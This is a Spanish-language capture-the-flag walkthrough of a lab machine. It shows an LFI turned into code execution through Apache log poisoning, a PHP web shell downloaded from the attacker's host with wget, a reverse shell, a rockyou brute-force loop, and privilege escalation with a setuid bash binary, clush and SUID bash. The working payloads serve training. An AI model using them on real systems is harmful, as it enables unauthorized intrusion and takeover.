### Enumeracion de Puertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 2000 172.17.0.2
```
```ruby
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-24 19:06 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000040s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: P\xC3\xA1gina Interactiva
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.49 seconds
```
nmap solo me reporta un puerto el cual es un servicio web asi que lo chequeo

![image](https://github.com/user-attachments/assets/d5ecf16d-50e8-463b-9f5b-6fa5b76cbaa8)

si chequeo el servicio web observo un script `.js` el cual inspecciono

![image](https://github.com/user-attachments/assets/db40b3a2-2b48-46f8-ad40-a42557dfda74)

![image](https://github.com/user-attachments/assets/37032b9b-519e-46dd-849e-29066ac4551e)

aqui observo algo particular `{alert("secret_dir");` asi que pruebo si es un directorio

![image](https://github.com/user-attachments/assets/bee65e5b-52c0-4742-a068-ac38ed52190b)

aqui veo un archivo asi que lo descargo y chequeo

![image](https://github.com/user-attachments/assets/b0adfdb1-5153-4883-a469-53d86d372ccc)

es un binario que solicita una credencial... chequeo si es vulnerable a un bof pero no, asi que lo inspecciono con `ghidra`

![image](https://github.com/user-attachments/assets/bb0d9dde-99a0-40d0-82f4-98d69eb2160e)

primero busco la funcion `main`

![image](https://github.com/user-attachments/assets/874ac08d-6f32-4334-9db3-1498a51964e3)

ahora chequeo el codigo decompilado

![image](https://github.com/user-attachments/assets/283ad07e-60a9-4946-89fb-5583afb8af63)

revisando el codigo se puede observar un llamado a la funcion `containsRequiredChars` asi que con dar doble clic en ella me redirige al codigo decompilado de dicha funcion

![image](https://github.com/user-attachments/assets/256f7468-3c64-4103-afe9-9b8c8b34ce0f)

este fragmento es el que me es de interes ya que se observa, se crean varias expresiones regulares utilizando el constructor std::__cxx11::basic_regex con patrones 
específicos: "@", "Mi", "S3cRet" y "d00m" lo cual me resulta curioso, asi que dichos strings los concateno y se los paso al binario como password

![image](https://github.com/user-attachments/assets/c6033018-dd45-4319-b0f2-43c36f51ddda)

por lo visto era la password y devuelve una cadena que parece codeada en base64

![image](https://github.com/user-attachments/assets/a7bf8584-94db-4191-90b2-a9ddc43f34c3)

esto tiene pinta a un subdominio por lo que testeo

![image](https://github.com/user-attachments/assets/02727b71-37be-4507-a8f1-c33774741080)

para esto primero agrego `g00dj0b.reverse.dl` en `/etc/hosts`, al ingresar en `experimentos insteractivos` observo 

![image](https://github.com/user-attachments/assets/50eb0468-01e1-4069-9172-769dbea69cb7)

pero detallemos la url `http://g00dj0b.reverse.dl/experiments.php?module=./modules/default.php`

testeo si puedo acceder a archivos del sistema a traves de la url con el parametro `module`

![image](https://github.com/user-attachments/assets/f3ec9b30-2557-4219-959a-e3140ad65c7c)

ya en este punto vemos que es vulnerable a un `LFI`, intento llevarlo a un `RCE` pero no obtengo resultado con `filter-chain` asi que intento acceder a los logs 

![image](https://github.com/user-attachments/assets/afe1d960-67b7-4d04-8759-7db05f9a36b6)

veo que tambien puedo acceder a `access.log` por lo que podria hacer un ataque `log-poisoning`...

Primero debemos entender como se lleva acabo este ataque, y es que consiste en el envenenamiento del access.log a traves del user-agent apuntando a una url valida, por 
lo que podria lanzar el siguiente comando:

```ruby
curl http://172.17.0.2 -A "<?php system('whoami') ?>"
```

```bash
enviamos la peticion a una direccion valida = http://172.17.0.2
usamos -A para definir nuestro User-Agent = -A "<?php system('whoami') ?>"
codigo php malicioso para el envenenamiento = <?php system('whoami') ?>
```
despues de enviar la peticion anterior con la inyeccion del codigo php malicioso en el `User-Agent` para una ejecucion de comandos en el servidor, refresco `http://g00dj0b.reverse.dl/experiments.php?module=/var/log/apache2/access.log` 
y observo

![image](https://github.com/user-attachments/assets/3b150b88-a5ba-42fc-976d-753b01c40350)

observo que la inyeccion del comando `whoami` en el `User-Agent` para envenenar el log a sido exitoso, por lo que puedo ejecutar comandos de sistema asi que primero creo 
en mi maquina atacante un archivo php malicioso con el siguiente contenido

```bash
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```
lo guardo como `code.php` y seguido me levanto un servidor con python

```ruby
python3 -m http.server 80
```
despues inyecto un comando al servidor para que descargue `code.php`

```ruby
curl http://172.17.0.2 -A "<?php system('wget 172.17.0.1/code.php -O /var/www/html/code.php') ?>"
```

este comando va apuntar la descarga contra el servidor que levante con python y guardara `code.php` en donde yo pueda acceder desde el navegador, despues 
de enviar la peticion con el User-Agent malicioso, refresco desde el navegador `http://g00dj0b.reverse.dl/experiments.php?module=/var/log/apache2/access.log` y 
observo desde el server python que la descarga se a realizado

![image](https://github.com/user-attachments/assets/b49dde42-b756-4b7c-966e-3b55c5da69ea)

ahora desde el navegador podre ejecutar comandos y enviarme una `revershell`

![image](https://github.com/user-attachments/assets/d0de64dd-98f8-408b-8850-9d5be2a5862a)

aqui testeo el archivo php malicioso descargado que esta 100% funcional, ahora me enviare una `revershell`

![image](https://github.com/user-attachments/assets/98880ef4-0f96-4a11-91ae-c53420689ff0)

He ganado acceso al servidor!!!

## Escalada de Privilegios

### www-data

tratamiento de la terminal

```bash
script /dev/null -c bash 
^Z
stty raw -echo; fg
reset xterm
stty rows 38 columns 168
export TERM=xterm
export SHELL=bash
```
![image](https://github.com/user-attachments/assets/b271fd7d-63b2-43a7-a9f8-7613345c03e6)

veo que puedo ejecutar un script como el user `nova` asi que lo ejecuto para testear

![image](https://github.com/user-attachments/assets/5ecd7cd8-fae8-468c-8dec-e616ac0c45bc)

parece que tendre que hacer un ataque de diccionario, esto lo hare de una forma bastante sencilla

```ruby
while IFS= read -r palabra; do echo "$palabra" | ./password_nova ; done < rockyou.txt |grep -v 'Contraseña incorrecta.'
```
![image](https://github.com/user-attachments/assets/2da1b208-edb7-45f3-802c-bb00e8966bc2)

ya obtenida la credencial procedo a cambiar de user

### nova

ahora siendo el user `nova` puedo ejecutar `/lib64/ld-linux-x86-64.so.2` como el user `maci`

![image](https://github.com/user-attachments/assets/1783a8fd-127a-427b-9366-e245db37d8bc)

para lograr escalar a `maci` se debe crear un binario que ejecute una `/bin/bash` para luego ejecutarlo con el cargador dinamico `/lib64/ld-linux-x86-64.so.2`


codigo `c`
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```
ahora lo compilo

```ruby
gcc -o exploit code.c
```

el binario debe moverse a un directorio que sea accesible por el user `maci` para que funcione asi que lo muevo a `/tmp` y lo ejecuto con el cargador dinamico

```ruby
sudo -u maci /lib64/ld-linux-x86-64.so.2 ./exploit
```

![image](https://github.com/user-attachments/assets/6650d1d1-e9d0-43f0-8827-ac2a8cc5ea8d)

### maci

con el user `maci` puedo ejecutar el binario `/usr/bin/clush` como `root`

![image](https://github.com/user-attachments/assets/ca568fa0-39a5-4eb2-8935-794cd59e81c3)

aqui demore mucho tiempo ya que testeaba diferentes formas de lograr ejecucion de comandos hasta que despues de un tiempo leyendo la documentacion di con la clave 

![image](https://github.com/user-attachments/assets/dc691175-988b-48dd-ada0-ac8458400569)

ejecutar una sesion interactiva! asi que vamos a ello

![image](https://github.com/user-attachments/assets/5fd3af02-c081-4953-b8d4-43aa17ae95a1)

ya en la sesion interactiva procedemos con la ejecucion de comandos

![image](https://github.com/user-attachments/assets/dce378eb-6332-4c87-8295-baf057f9094d)

en este punto le asigno el bit suid a `/bin/bash` para hacer la escalada final

![image](https://github.com/user-attachments/assets/a5bfcc74-39a1-4f68-8e17-916e3f1744a8)

salgo de la sesion interactiva y compruba la asignacion del bit suid para la posterior escalada

![image](https://github.com/user-attachments/assets/54717500-b6b3-4ce8-a51c-e5f4fcf5ee23)

para una escalada 100% modificare `/etc/passwd`

![image](https://github.com/user-attachments/assets/726ba12f-9ca2-4647-9713-123a59ae3f08)

### PWNED - ROOT










